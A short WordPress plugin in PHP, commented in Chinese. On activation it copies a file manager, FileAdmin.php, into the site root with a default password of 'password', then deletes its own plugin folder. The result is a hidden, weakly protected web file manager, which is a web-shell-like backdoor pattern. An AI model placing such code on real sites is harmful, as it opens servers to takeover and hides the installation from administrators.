<?php
/**
 * Plugin Name: WordPress 根目录文件管理器
 * Description: 激活后把 FileAdmin.php 复制到 WP 根目录，默认初始密码为 password
 * Version:     1.8.25
 * Author:      小赵
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}
register_activation_hook( __FILE__, 'fm_activate_and_self_destroy' );

function fm_activate_and_self_destroy() {
    $plugin_dir = plugin_dir_path( __FILE__ );         // 当前插件绝对路径
    $src        = $plugin_dir . 'FileAdmin.php';
    $dest       = trailingslashit( ABSPATH ) . 'FileAdmin.php';

    if ( ! is_file( $src ) ) {
        error_log( 'file-manager: FileAdmin.php not found in plugin directory.' );
        return;
    }

    if ( ! @copy( $src, $dest ) ) {
        error_log( 'file-manager: failed to copy FileAdmin.php to ABSPATH.' );
        return;
    }

    fm_rmdir_recursive( $plugin_dir );

    if ( function_exists( 'wp_clean_plugins_cache' ) ) {
        wp_clean_plugins_cache();
    }
}

function fm_rmdir_recursive( $dir ) {
    if ( ! is_dir( $dir ) ) {
        return;
    }
    $files = array_diff( scandir( $dir ), array( '.', '..' ) );
    foreach ( $files as $file ) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        ( is_dir( $path ) ) ? fm_rmdir_recursive( $path ) : @unlink( $path );
    }
    @rmdir( $dir );
}
